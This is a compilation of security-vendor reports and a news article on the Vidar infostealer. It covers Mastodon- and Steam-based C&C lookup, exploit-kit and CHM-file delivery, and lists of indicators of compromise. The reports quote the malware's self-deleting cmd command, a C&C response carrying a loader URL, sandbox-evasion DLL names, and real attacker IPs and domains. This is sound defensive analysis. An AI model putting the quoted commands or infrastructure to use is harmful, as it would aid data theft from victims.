Vidar Stealer, as the name suggests, is a malware family that is designed to steal and exfiltrate user information. This includes data such as credentials, cryptocurrency wallets and browser cookies. It's widely believed that the family evolved from Arkei Stealer - another infostealer with similar capabilities. There is an excellent blogpost1 by @fumik0_ describing the similarities and differences. While previous versions of the malware used to have C&C server address hardcoded directly in the sample, these days, it uses a bit more novel approach where the address is fetched from a social media platform like FACEIT or Mastodon.

String decryption and usage Let's see how the strings in question were extracted and what are the semantics behind their usage. The encryption is pretty straightforward. Each blob is produced by xoring two static strings located in the .rdata section.

Xor string decryption

3/10

The decoded strings are then used in a subsequent section of the binary, where they are compared with hostnames of stolen credentials.

Iteration over stolen credentials If at least one domain is matched, a global flag is incremented.

Hostname needle search

4/10

What's unusual about these Vidar samples is the use of a second C&C server responsible for handling credentials used when the global flag is set."|data_input/vidar_reports/entry_aca6ac16-9a47-4416-a66e-d333136a459b.text|18643e2c13534615acb5d943abaf1994
"What's unusual about these Vidar samples is the use of a second C&C server responsible for handling credentials used when the global flag is set.

Alternative C&C server lookup For the Vidar version analyzed, the C&C address is not stored directly in the sample but fetched from a specific user profile on the Mastodon platform. In this specific sample, the default profile is @oleg98 , and for reporting credentials from hosts of interest, @artemida is used.

5/10

Mastadon artemida profile



pointing to 167.86.127.231

Mastadon oleg98 profile



pointing to 65.108.80.190

Campaign background Unfortunately, we don't have much information on how the campaign was delivered and which entities were targeted directly. What is interesting, though, is that the actor used several other malware families. 6/10

Let's take a look at source samples in MWDB. We'll use mwdblib to quickly find the files that were extracted into the config in question. mwdb search files 'child:(child: (config.dhash:abed3750173760a9bcc5f6d78ccdd3557ce27135c8c5e6e593a9a7387e738c4e))'

All matched samples and accompanying tags:

7/10

'77737d30b68a8fa75847570bfaa2c718875c532de61d7a5643504a1ac892a330',

['feed:malwarebazaar', 'ripped:raccoon', 'ripped:vidar', 'runnable:win32:exe',

'yara:win_karius', 'yara:win_raccoon', 'yara:win_smokeloader']

'9405f9084c8ec3eff442b83c20928fceb3e6372d504381b0527a7512a9889231',

['feed:malwarebazaar', 'feed:urlhaus', 'ripped:vidar', 'runnable:win32:exe',"|data_input/vidar_reports/entry_aca6ac16-9a47-4416-a66e-d333136a459b.text|c5dce9513117475394c9f6adeefa0b25
"'9405f9084c8ec3eff442b83c20928fceb3e6372d504381b0527a7512a9889231',

['feed:malwarebazaar', 'feed:urlhaus', 'ripped:vidar', 'runnable:win32:exe',

'urlhaus:arkeistealer', 'urlhaus:exe']

'062c573497b73b4feaa77a78c2c76f6b095e51de635ac936e034f72afa081ecf',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe', 'yara:win_stop']

'c8aa42e07176d24c933d1e2bc4f0052b2973f98fc6e395d90f09e07dbf7c0585',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'736b919068232acf7aae67e3ca5e915c89faade4110b31ff75c249ade1991ef6',

['et:smokeloader', 'feed:malwarebazaar', 'feed:urlhaus', 'ripped:vidar',

'runnable:win32:exe', 'urlhaus:32', 'urlhaus:exe', 'yara:win_smokeloader']

'ebe82a7d2f2f9989a5e4ef6a4602a8224abdff7aef5baa6beacb5977c02ac3e0',

['et:raccoon_stealer', 'et:redline', 'feed:malwarebazaar', 'ripped:raccoon',

'ripped:vidar', 'runnable:win32:exe', 'yara:win_raccoon']

'dbc78e2174ea6ef2807de19d0c1c60d0d027ce3d83a001d0d1bb603afad2f961', ['et:avecaesar',

'et:raccoon_stealer', 'et:redline', 'feed:urlhaus', 'ripped:redlinestealer',

'ripped:vidar', 'runnable:win32:exe']

'106d93ced41d81795f66bb29ad5c847a25a1e2c094fe28a67dc576f1c33fcad4',

['et:raccoon_stealer', 'et:redline', 'feed:urlhaus', 'ripped:raccoon',

'ripped:vidar', 'runnable:win32:exe', 'yara:win_raccoon']

'd7480662bc7ee6dc38227ea381978553b1774774e4a0a70ea3bf6aebbca48622', ['et:bitrat',

'et:redline', 'feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']"|data_input/vidar_reports/entry_aca6ac16-9a47-4416-a66e-d333136a459b.text|2e5ce8931e5c43a7868f1816778eabc1
"'et:redline', 'feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'4bc52cd8296fcffc22b5ca8ebf2b161260d71c8d34658f45c9c93cf6d65749e9',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'4b3e6a191ab050a87aeeb8a650290c4e217e9508971beeb929417d13d89292e2',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe', 'yara:win_stop']

'c95d04ae659ff27da971c970ec072ffbec37551120fe8c395d5455fba4139d0d',

['et:smokeloader', 'feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe',

'yara:win_smokeloader']

'6aae67d87cd2ef23c4b9265c8e83db5142f00154e66e47b1e54219cea794682b',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe', 'yara:win_stop']

'aad6294207c2facfebf440fa5d52804422edbf9c9e9adb4a7aaff0310b1c5d11',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe', 'yara:win_stop']

'43b31ea75f3c0666523aefc13e216a651e8e93feaeff1165cb35ed374365cdd6',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe', 'yara:win_stop']

'd7b0380241e4d47fc00e72faa08831b51b0ae360d5ccc45717f39f3106c3020a',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe', 'yara:win_karius',

'yara:win_smokeloader']

'995d009e2fa6b510a0251895e0e71d0709ebfdeac782eae91caa3b4ee30bd29b',

['feed:malwarebazaar', 'ripped:redlinestealer', 'ripped:vidar', 'runnable:win32:exe',

'yara:win_karius', 'yara:win_smokeloader']

'6c2ad98af84288aff6f49ae92f9f71befbfaa4ac35d1a05b1441f1ce15124ee0',

['feed:malwarebazaar', 'ripped:raccoon', 'ripped:redlinestealer', 'ripped:vidar',"|data_input/vidar_reports/entry_aca6ac16-9a47-4416-a66e-d333136a459b.text|c0b8fab1ddc14decb5f5c3f8a7e1cf77
"['feed:malwarebazaar', 'ripped:raccoon', 'ripped:redlinestealer', 'ripped:vidar',

'runnable:win32:exe', 'yara:win_raccoon', 'yara:win_smokeloader', 'yara:win_stop']

'3276f5cb5545e19704b1ef2897c17d721d6e156323f48f19275997d3cc62d005',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'ee6cb977e78651d7b9a3fd412a40f6e2cd1501f05b04c49e744db35c83181132',

['et:raccoon_stealer', 'et:redline', 'feed:malwarebazaar', 'ripped:raccoon',

'ripped:redlinestealer', 'ripped:vidar', 'runnable:win32:exe', 'yara:win_raccoon',

'yara:win_smokeloader']

'22dbf29f7b7ee63da9418ab462b83e242823b83af7d697e7cf34796febc4d884',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'149d9555994e5930d863674a2c55d295d5a19446bed86ef1079ccbbbdae9975f',

8/10

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'90618d3aa5146d27b46476a4c7bfcc2e5323b74dcbcf2c0af6b4f00c4c2d9297',

['et:raccoon_stealer', 'et:redline', 'feed:malwarebazaar', 'ripped:vidar',

'runnable:win32:exe']

'7a5444f5316764d3960132052abe097784a29b7390e0ece10c86b804c125100f',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'98ee19dbbe959081f2d95b7f56af58fcb7ecdc5b85bb9ee13775376b9bad1ccf',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'9fefd930a1cc7b257fe5a65bc3eda3167bc0f82895f288fc34eaca3411b2688b',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'11a83b7f651c007cef7ca9490fc560dbfda8cd6b538199e277047c8087c7cee0',"|data_input/vidar_reports/entry_aca6ac16-9a47-4416-a66e-d333136a459b.text|18a4120f7f134072a4278e306960fe41
"['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'11a83b7f651c007cef7ca9490fc560dbfda8cd6b538199e277047c8087c7cee0',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe', 'yara:win_stop']

'611796a36903059a2d1725d7849a375b9aa2902254c0d5f5fa2122e83570ea3a',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'7ec5f24e6f59719e6c071ec719dcfcbe8e48f5293f493b903f19446c1815048b',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'518e682b4f0226db5e1abb7b62a32a2f46db719b6c407317273cbef56c811657', ['feed:urlhaus',

'ripped:vidar', 'runnable:win32:exe', 'urlhaus:arkeistealer', 'urlhaus:exe']

'bf4d1dcd4b9129f47ec4239fa5a33e00c981e5fac5b8be880b76d2a1f5753c34',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'd9b6823ca8e13b78c269c5d21e948dbab625ea87d3370d163eeabeb3822aef56',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'8a2abfa467352b278a1233aead9dffbb23a6d17bd50fe22e275ca92a1911c23c', ['feed:urlhaus',

'ripped:vidar', 'runnable:win32:exe', 'urlhaus:arkeistealer', 'urlhaus:exe']

'1fbbaa6cfa20d6e11a3e5e4ba0702f608d474cbf5a86eef891fb57a671c684be',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'2692f4594cebfa3afca882274dc1432fea1ccbc7d3f37db3e15059722db1d97b',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

'9cffbade290f88c34b8a5e2e551fd9ae035eeda9d49d0eb0fecec8e40ecf2e84',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']"|data_input/vidar_reports/entry_aca6ac16-9a47-4416-a66e-d333136a459b.text|f0a7d3218d674e1da1e8e8e5ddc22fe9
"'9cffbade290f88c34b8a5e2e551fd9ae035eeda9d49d0eb0fecec8e40ecf2e84',

['feed:malwarebazaar', 'ripped:vidar', 'runnable:win32:exe']

We can see that besides Vidar, MWDB was also able to detect and extract configurations from the following malware families: Raccoon RedLine Stealer SmokeLoader STOP ransomware All of the recognized samples were uploaded as a part of the URLhaus2, and MalwareBazaar3 feeds, both developed by abuse.ch.

Indicators of Compromise

C&C profile proxies

hxxps://mas.to/@sslam

hxxps://mas.to/@serg4325

hxxps://mas.to/@xeroxxx

hxxps://mas.to/@oleg98

9/10

hxxps://mas.to/@artemida

C&C servers

65.108.80[. ]190

167.86.127[. ]231

Samples

16c3f8999141beee55afdb49670b9e44b4916816faeb643639a7ace81c13806a

1d4ecd52ab85b7f5229f00ee10d438286e361d4c304000abca8b3dcbe1d7c720

77737d30b68a8fa75847570bfaa2c718875c532de61d7a5643504a1ac892a330

9405f9084c8ec3eff442b83c20928fceb3e6372d504381b0527a7512a9889231

062c573497b73b4feaa77a78c2c76f6b095e51de635ac936e034f72afa081ecf

c8aa42e07176d24c933d1e2bc4f0052b2973f98fc6e395d90f09e07dbf7c0585

736b919068232acf7aae67e3ca5e915c89faade4110b31ff75c249ade1991ef6

ebe82a7d2f2f9989a5e4ef6a4602a8224abdff7aef5baa6beacb5977c02ac3e0

dbc78e2174ea6ef2807de19d0c1c60d0d027ce3d83a001d0d1bb603afad2f961

106d93ced41d81795f66bb29ad5c847a25a1e2c094fe28a67dc576f1c33fcad4

d7480662bc7ee6dc38227ea381978553b1774774e4a0a70ea3bf6aebbca48622

4bc52cd8296fcffc22b5ca8ebf2b161260d71c8d34658f45c9c93cf6d65749e9"|data_input/vidar_reports/entry_aca6ac16-9a47-4416-a66e-d333136a459b.text|ae1a9d16d9c24c42a0d88b956c3dadb1
"d7480662bc7ee6dc38227ea381978553b1774774e4a0a70ea3bf6aebbca48622

4bc52cd8296fcffc22b5ca8ebf2b161260d71c8d34658f45c9c93cf6d65749e9

4b3e6a191ab050a87aeeb8a650290c4e217e9508971beeb929417d13d89292e2

c95d04ae659ff27da971c970ec072ffbec37551120fe8c395d5455fba4139d0d

6aae67d87cd2ef23c4b9265c8e83db5142f00154e66e47b1e54219cea794682b

aad6294207c2facfebf440fa5d52804422edbf9c9e9adb4a7aaff0310b1c5d11

43b31ea75f3c0666523aefc13e216a651e8e93feaeff1165cb35ed374365cdd6

d7b0380241e4d47fc00e72faa08831b51b0ae360d5ccc45717f39f3106c3020a

995d009e2fa6b510a0251895e0e71d0709ebfdeac782eae91caa3b4ee30bd29b

6c2ad98af84288aff6f49ae92f9f71befbfaa4ac35d1a05b1441f1ce15124ee0

3276f5cb5545e19704b1ef2897c17d721d6e156323f48f19275997d3cc62d005

ee6cb977e78651d7b9a3fd412a40f6e2cd1501f05b04c49e744db35c83181132

22dbf29f7b7ee63da9418ab462b83e242823b83af7d697e7cf34796febc4d884

149d9555994e5930d863674a2c55d295d5a19446bed86ef1079ccbbbdae9975f

90618d3aa5146d27b46476a4c7bfcc2e5323b74dcbcf2c0af6b4f00c4c2d9297

7a5444f5316764d3960132052abe097784a29b7390e0ece10c86b804c125100f

98ee19dbbe959081f2d95b7f56af58fcb7ecdc5b85bb9ee13775376b9bad1ccf

9fefd930a1cc7b257fe5a65bc3eda3167bc0f82895f288fc34eaca3411b2688b

11a83b7f651c007cef7ca9490fc560dbfda8cd6b538199e277047c8087c7cee0

611796a36903059a2d1725d7849a375b9aa2902254c0d5f5fa2122e83570ea3a

7ec5f24e6f59719e6c071ec719dcfcbe8e48f5293f493b903f19446c1815048b

518e682b4f0226db5e1abb7b62a32a2f46db719b6c407317273cbef56c811657"|data_input/vidar_reports/entry_aca6ac16-9a47-4416-a66e-d333136a459b.text|2233b6404c8d40c18cdba91cb044d48f
"7ec5f24e6f59719e6c071ec719dcfcbe8e48f5293f493b903f19446c1815048b

518e682b4f0226db5e1abb7b62a32a2f46db719b6c407317273cbef56c811657

bf4d1dcd4b9129f47ec4239fa5a33e00c981e5fac5b8be880b76d2a1f5753c34

d9b6823ca8e13b78c269c5d21e948dbab625ea87d3370d163eeabeb3822aef56

8a2abfa467352b278a1233aead9dffbb23a6d17bd50fe22e275ca92a1911c23c

1fbbaa6cfa20d6e11a3e5e4ba0702f608d474cbf5a86eef891fb57a671c684be

2692f4594cebfa3afca882274dc1432fea1ccbc7d3f37db3e15059722db1d97b

9cffbade290f88c34b8a5e2e551fd9ae035eeda9d49d0eb0fecec8e40ecf2e84

446d53cdc62a86025835e93938afeb9c1b24f28f2bade4980c01ac517b76c760

References

10/10"|data_input/vidar_reports/entry_aca6ac16-9a47-4416-a66e-d333136a459b.text|04651b5e73154ce3850fbd601c935286
"Vidar and GandCrab: stealer and ransomware combo observed in the wild blog.malwarebytes.com/threat-analysis/2019/01/vidar-gandcrab-stealer-and-ransomware-combo-observed-in-the-wild/ Jérôme Segura

January 4, 2019

We have been tracking a prolific malvertising campaign for several weeks and captured a variety of payloads, including several stealers. One that we initially identified as Arkei turned out to be Vidar, a new piece of malware recently analyzed in detail by Fumik0_ in his post: Let’s dig into Vidar – An Arkei Copycat/Forked Stealer (In-depth analysis). In Norse Mythology, Víðarr is a god and son of Odin, whose death it is foretold he will avenge. Being referred to as “The Silent One” seems to be fitting for this stealer that can loot from browser histories (including Tor Browser) and cryptocurrency wallets, capture instant messages, and much more. We witnessed a threat actor using the Fallout exploit kit to distribute Vidar. But victims won’t notice that as much, as the secondary and noisier payload being pushed is GandCrab ransomware.

Overview A malvertising chain leads us to the Fallout exploit kit followed by what we thought was an Arkei stealer. Upon closer look, while the sample did share a lot of similarities with Arkei (including network events), it was actually a newer and, at the time, not yet publicly described piece of malware now identified as Vidar.

1/7"|data_input/vidar_reports/entry_07f9a956-a441-4c5b-8318-1d9071d50928.text|80d5c0defd0348e283d363a98bc38dc3
"1/7

Beyond Vidar’s stealer capabilities, we also noticed a secondary payload that was retrieved from Vidar’s own command and control (C2) server. The infection timeline showed that victims were first infected with Vidar, which tried to extract confidential information, before eventually being compromised with the GandCrab ransomware.

Malvertising and Fallout exploit kit Torrent and streaming video sites drive a lot of traffic, and their advertising is often aggressive and poorly-regulated. A malicious actor using a rogue advertising domain is redirecting these site visitors according to their geolocation and provenance to at least two different exploit kits (Fallout EK and GrandSoft EK), although the former is the most active. Stealers such as AZORult seem to be the a favorite payload here, but we also noticed that Arkei/Vidar was quite common. In this particular instance, we saw Vidar being pushed via the Fallout exploit kit.

2/7

Vidar It should be noted that Vidar is sold as a product, and as such can be distributed by several different threat groups through different campaigns.

Vidar customers can customize the stealer via profiles, which gives them a way to adjust which kind of data they are interested in. Beyond the usual credit card numbers and other passwords stored in applications, Vidar can also scrape an impressive selection of digital wallets.

3/7"|data_input/vidar_reports/entry_07f9a956-a441-4c5b-8318-1d9071d50928.text|7495daff6a0f4dc686013f3479d94043
"3/7

Upon execution on the system, Vidar will search for any data specified in its profile configuration and immediately send it back to the C2 server via an unencrypted HTTP POST request. This includes high level system details (specs, running processes, and installed applications) and stats about the victim (IP address, country, city, and ISP) stored in a file called information.txt. This file is packaged along with other stolen data and zipped before being sent back to the C2 server.

4/7

GandCrab as a loader Vidar also offers to download additional malware via its command and control server. This is known as the loader feature, and again, it can be configured within Vidar’s administration panel by adding a direct URL to the payload. However, not all instances of Vidar (tied to a profile ID) will download an additional payload. In that case, the server will send back a response of “ok” instead of a URL. HTTP/1.1 200 OK Date: Content-Type: text/html; charset=UTF-8 Connection: keep-alive Server: Pro-Managed Content-Length: 51 http://ovz1.fl1nt1kk.10301.vps.myjino[. ]ru/topup.exe;

5/7

Within about a minute after the initial Vidar infection, the victim’s files will be encrypted and their wallpaper hijacked to display the note for GandCrab version 5.04."|data_input/vidar_reports/entry_07f9a956-a441-4c5b-8318-1d9071d50928.text|888daad8260247a19444c2b3107c4063
"Ransomware as a last payload While ransomware experienced a slowdown in 2018, it is still one of the more dangerous threats. In contrast to many other types of malware, ransomware is instantly visible and requires a call to action, whether victims decide to pay the ransom or not. However, threat actors can use ransomware for a variety of reasons within their playbook. It could be, for instance, a simple decoy where the real goal is to irreversibly corrupt systems without any way to recover lost data. But as we see here, it can be coupled with other threats and used as a last payload when other resources have already been exhausted. As a result, victims get a double whammy. Not only are they robbed of their financial and personal information, but they are also being extorted to recover the now encrypted data. Malwarebytes users are protected against this threat at multiple levels. Our signatureless anti-exploit engine mitigates the Internet Explorer and Flash Player exploits delivered by the Fallout exploit kit. We detect the dropped stealer as Spyware.Vidar and also thwart GandCrab via our anti-ransomware module.

Acknowledgements Many thanks to Fumik0_ and @siri_urz for their inputs and Vidar payload identification.

Indicators of Compromise (IOCs)

Vidar binary

E99DAF10E6CB98E93F82DBE344E6D6B483B9073E80B128C163034F68DE63BE33

Vidar C2

kolobkoproms[. ]ug

6/7

Loader URL (GandCrab)

ovz1.fl1nt1kk.10301.vps.myjino[. ]ru/topup.exe

GandCrab binary"|data_input/vidar_reports/entry_07f9a956-a441-4c5b-8318-1d9071d50928.text|5129eca2a5ba41aeb9998daee0a5944b
"Vidar C2

kolobkoproms[. ]ug

6/7

Loader URL (GandCrab)

ovz1.fl1nt1kk.10301.vps.myjino[. ]ru/topup.exe

GandCrab binary

ABF3FDB17799F468E850D823F845647738B6674451383156473F1742FFBD61EC

7/7"|data_input/vidar_reports/entry_07f9a956-a441-4c5b-8318-1d9071d50928.text|4d3f1e9313344dfc9ff5b577ed1b2b60
"Vidar Malware Launcher Concealed in Help File trustwave.com/en-us/resources/blogs/spiderlabs-blog/vidar-malware-launcher-concealed-in-help-file/

Appending a malicious file to an unsuspecting file format is one of the tricks our adversaries use to evade detection. Recently, we came across an interesting email campaign employing this technique to deliver the info stealer Vidar malware. First, let’s examine the email delivery mechanism, then go on to take a closer look at the Vidar malware itself.

Figure 1: The malicious spam message The messages in this campaign have two things in common. First, the email body has similar text, which as usual, directs the recipient’s attention to the attachment.

1/7

Second, the email contains only one attachment named “request.doc”, which is actually an ISO file. ISO is a disk image file format that cybercriminals repurpose for use as a malware container. In this campaign, the ISO attachment holds two files – a Microsoft Compiled HTML Help (CHM) file “pss10r.chm” and an executable “app.exe.” Once the attacker tricks the recipient into extracting the contents of “request.doc” and then executes either one, the system can be compromised.

The CHM Loader CHM is Microsoft Proprietary online help file format normally used for software documentation. When executed, Microsoft Help Viewer (hh.exe) loads the primary object of the CHM.

Figure 2: The MailMarshal unpack tree of the ISO attachment

2/7"|data_input/vidar_reports/entry_c1b3b309-1ad3-413e-a9c9-0ccb5a360f8d.text|d98a5563bf4649a1b0c9187652a47b82
"Figure 2: The MailMarshal unpack tree of the ISO attachment

2/7

As shown in Figure 2, MailMarshal supports the unpacking of ISO and CHM files. One of the objects unpacked from the CHM is the HTML file “PSSXMicrosoftSupportServices_HP05221271.htm”- the primary object that gets loaded once the CHM “pss10r.chm” is opened. This HTML has a button object which automatically triggers the silent re-execution of the CHM “pss10r.chm” with mshta.

Figure 3: The legitimate PSS10R.CHM in Windows vs the one contained in the ISO attachment Mshta is a Windows binary used for executing HTA files. Looking at the CHM “pss10r.chm” statically, some HTML Application (HTA) code is noticeably lurking at the tail end. The appended HTA has some JavaScript that silently runs ‘app.exe’, the second file inside the ISO attachment. Note that for this loader to work, the executable must be extracted to the same directory as the CHM file.

3/7

Figure 4: The HTA appended at the CHM Loader ‘pss10r.chm’

The Vidar Malware The executable “app.exe” is the malware known as Vidar, which is an information stealer compiled in C++ capable of harvesting system information and data from a wide range of browsers and other applications in the system.

Figure 5: Vidar advertised on ultrahacks.org

4/7"|data_input/vidar_reports/entry_c1b3b309-1ad3-413e-a9c9-0ccb5a360f8d.text|25c4d3583e2342cd8288418427a27930
"Figure 5: Vidar advertised on ultrahacks.org

4/7

Once executed, this malware will not proceed to its malicious routine if the computer and username of the system is JohnDoe and HAL9TH, respectively (artifacts from Windows Defender emulator), and if the following DLLs related to sandbox and AV and email scanners are loaded into the system. api_log.dll cmdvrt64.dll snxhk.dll avghookx.dll dir_watch.dll vmcheck.dll avghooka.dll pstorec.dll wpespy.dll cmdvrt32.dll sbiedll.dll The Vidar samples we obtained, which were all version 50.3, retrieve their command and control (C&C) servers from Mastodon, an open-source social networking platform. The samples searched the following profiles and grab the C&C from the Bio section: mastodon.social@kill5rnax noc.social@kill6nix

Figure 6: The Mastodon profile containing Vidar’s C&C Before the stealing routine, Vidar downloads its dependencies from the C&C and saves them at C:\ProgramData. Then, it retrieves its configuration setting. freebl3.dll mozglue.dll msvcp140.dll 5/7

ns33.dll

softokn3.dll

vcruntime140.dll

Figure 7: The returned setting with 95[.]216[.]181[. ]231/1149 Vidar creates its own folder at C:\ProgramData. The data it collected from the infected system are saved on C:\ProgramData\<random>\files. Then, this is archived at C:\ProgramData\<random>\<machine GUID>.zip and sent to the C&C."|data_input/vidar_reports/entry_c1b3b309-1ad3-413e-a9c9-0ccb5a360f8d.text|0bb341e1bb8b48af8337c68cde7408d4
"Figure 8: The folders and files created by “app.exe” We observed in the code that in response, the C&C can send a download URL of an executable. This process can lead to another malware being installed in the system.

Figure 9: Vidar can download and execute an executable

6/7

Lastly, the files created by this threat are deleted, as well as all the DLL files in %programdata%. Below is the command used. C:\Windows\System32\cmd.exe /c taskkill /im <Vidar executable> /f & timeout /t 6 & del /f /q \"" <Vidar filepath>\"" & del C:\ProgramData\*.dll & exit

IOC

request.doc (1996800 bytes)

SHA1: 4E5BC4B8CB05872721C1D4965C14D395ED0B3221

pss10r.chm ( 949858 bytes)

SHA1: EFE3E712C667CE1D61C8613D03F7EAE31782BDBF

PSSXMicrosoftSupportServices_HP05221271.htm (2710 bytes)

SHA1: 762DF02815D9E5A4D4058081D3FF479853B1348D

app.exe (674304 bytes)

SHA1: 8CB6279E76DCA6DFDEF1079CB336C0F2D69AC9D3

95[.]216[.]181[. ]231



C&C

7/7"|data_input/vidar_reports/entry_c1b3b309-1ad3-413e-a9c9-0ccb5a360f8d.text|745996aedb13467cba535821734149c7
"Microsoft help files repurposed to contain Vidar malware in new campaign csoonline.com/article/3654849/microsoft-help-files-repurposed-to-contain-vidar-malware-in-new-campaign.html Jon Gold

A new email campaign designed to spread the Vidar spyware package uses a novel technique involving Microsoft Compiled HTML help files, according to a blog post released today by Trustwave. The help files, which use the suffix “CHM,” are packaged in an ISO along with the Vidar payload in what appears to be a Word document. If the attacker successfully hoodwinks the target into extracting the phony document, executing either file triggers the malicious package and compromises the system, Trustwave researcher Diana Lopera wrote in the post. The CHM file used in the attack is mostly a copy of a legitimate CHM, but has appended HTML application code – that extra code silently runs the malicious executable in the background when the CHM file is run.

1/2"|data_input/vidar_reports/entry_9830193e-ec57-4598-8f90-5c0a8f49989d.text|d493ff385ad64d14b28a55017871e7f9
"1/2

The particular flavor of Vidar used in the attack, Lopera noted, is version 50.3, and receives its command-and-control (C&C) instructions from accounts on open-source social networking platform Mastodon. Once up and running, the malware downloads configuration information from C&C servers identified by the Mastodon page and starts its work – first collecting system information and password data from browsers and other applications, sending that information as a ZIP file back to the C&C server, and then deleting itself, potentially after pulling additional malware onto the infected machine. “Appending a malicious file to an unsuspecting file format is one of the tricks our adversaries use to evade detection,” wrote Lopera."|data_input/vidar_reports/entry_9830193e-ec57-4598-8f90-5c0a8f49989d.text|be2240fd0e324ec6b97aff7a0a23f945
"What is Vidar? Vidar was first observed in the wild in late 2018, according to a report from cloud security vendor Infoblox, which noted that it’s a variant of the earlier Arkei infostealer. It’s sold commercially in online forums, and has the ability to steal a wide variety of user information and valuable data from infected computers, including credit card numbers, usernames and passwords, desktop screenshots, and cryptocurrency wallets. It can even bypass some types of two-factor authentication, particularly targeting the Authy 2FA stack. As ever, strong email security practices can mitigate or eliminate the risks posed by Vidar – extreme caution should be used when opening email attachments from unfamiliar senders with generic subject lines, and verification either over the phone or in person should be the first move if there is any doubt about such a message’s legitimacy.

2/2"|data_input/vidar_reports/entry_9830193e-ec57-4598-8f90-5c0a8f49989d.text|afd6feace1af4149a8f657caec5335ae
"Malware Analysis Report

Vidar



Stealerware

TLP Status: White

+44 333 444 0041

quorumcyber.com

Verdant, 2 Redheughs Rigg, Edinburgh, United Kingdom, EH12 9DQ

Table of Contents

Document Control

4

Revision History

4

Related Documents

4

Executive Summary

5

Introduction

5

Malware History

6

Malware Details

7

Metadata

7

Mitre ATT&CK TTPs

10

Malware Functionality

12

Overview

12

High



Level Overview

13

Setup.exe

14

Metadata

14

Analysis

14

moabLuck2.exe

17

Metadata

17

Analysis

17

Bebra.exe

19

Metadata

19

Analysis

19

Mina.exe

21

Metadata

21

Analysis

21

Clip1.exe

24

Metadata

24

Analysis

24

Communications

26

Vidar Command and Control

26

Clipper Command and Control

28

Threat Intelligence

29

Indicators of Compromise – Domains

29

hxxp[://]clipper[. ]guru

29

hxxps[://]laplas[. ]app/signin

29

hxxps[://]t[. ]me/year2023start

30

hxxps[://]steamcommunity[. ]com/profiles/76561199467421923

32

Indicators of Compromise – IPv4 Addresses

TLP Status: White

33

Privileged & Confidential

Page 2 of 39

94[.]130[.]190[. ]48

33

91[.]107[.]156[. ]138

34

49[.]12[.]113[. ]110

34

5[.]75[.]173[. ]242

35

89[.]208[.]104[. ]172

35

77[.]73[.]134[. ]24

36

116[.]202[.]7[. ]135

36

49[.]12[.]8[. ]228

37

Detection

38

Indicators of Compromise

38

TLP Status: White

Privileged & Confidential

Page 3 of 39

Document Control

Revision History

Ver sion

Date

Summary of Changes

0.1

GG

27/01/2023

Initial draft

0.2"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|cdf9ae435c514f21a5ac208a74e94137
"Page 3 of 39

Document Control

Revision History

Ver sion

Date

Summary of Changes

0.1

GG

27/01/2023

Initial draft

0.2

RS, GG, CW

01/02/2023

Reviewed and updated

0.3

MCD, JAT,

JA

02/02/2023

Peer review

0.4

MP

03/02/2023

Review

0.5

RS, GG, CW

03/02/2023

Recommendations implemented

1.0

RS

03/02/2023

Document release

Related Documents The following documents are either referenced within, or are related to, the content of this document: Doc ument Name

Date

Ver sion

Malware



Analysis



Summary



Vidar.pdf

16/01/2023

1.0

TLP Status: White

Privileged & Confidential

Page 4 of 39

Executive Summary



Vidar is a strain of “information stealer”, or “infostealer”, malware, compiled in C++, which collects personal information, private documents, and account data from the devices of infected users. The malware itself is either a fork, or evolution of, the “Arkei” malware variant. Moreover, Vidar malware can be obtained as a “Malware-as-a-Service (MaaS)” offering, meaning that the threat group can lease out the same infrastructure to multiple, less established, threat actors for a variety of purposes. In the case that we examined, aside from the initial data theft, the malware strain was also detected to have been utilised to infect the victim with coin miners, crypto hijackers, and additional infostealer strains."|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|fa4ed261add4483ebaaf42b90fd09648
"The malware performed data exfiltration on any available data within the affected user's profile prior to installing further command & control (C2) persistence mechanisms and subsequently interacting with a malicious IP address for further instruction.



The malicious payload was contained within a seemingly legitimate software executable and was presented to the user via a search engine advertisement masquerading as a legitimate resource. This was sufficient to trick the user into downloading and executing it. In this instance, the advertisement offered a free version of the Adobe Illustrator application, while the software executable itself was originally a Yahtzee scoreboard.



The malware was detected as having connected to two legitimate services, namely, Telegram and Steam, to ascertain C2 information. The malware then communicated with an attacker-controlled server to receive instructions, upload stolen data, and obtain further malicious payloads. Following successful execution of the infostealer, an XMRIG cryptocurrency miner was installed.



A malware strain with stealer functionality, known as ‘Bebra’, was also detected."|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|bae09afbbe6f488d85aa664258f9c63e
"A malware strain with stealer functionality, known as ‘Bebra’, was also detected.

